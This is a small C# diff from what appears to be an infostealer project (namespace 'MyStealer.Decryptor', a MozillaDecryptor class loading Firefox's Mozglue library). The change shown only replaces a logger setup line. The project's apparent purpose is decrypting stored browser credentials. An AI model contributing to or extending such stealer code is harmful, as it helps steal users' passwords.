@@ -13,7 +13,7 @@ namespace MyStealer.Decryptor
     /// </summary>
     public partial class MozillaDecryptor : IDisposable
     {
-        private static readonly ILogger logger = Log.ForContext<MozillaDecryptor>();
+        private static readonly ILogger logger = LogExt.ForModule(nameof(MozillaDecryptor));
 
         /* HMODULE */
         private IntPtr Mozglue;
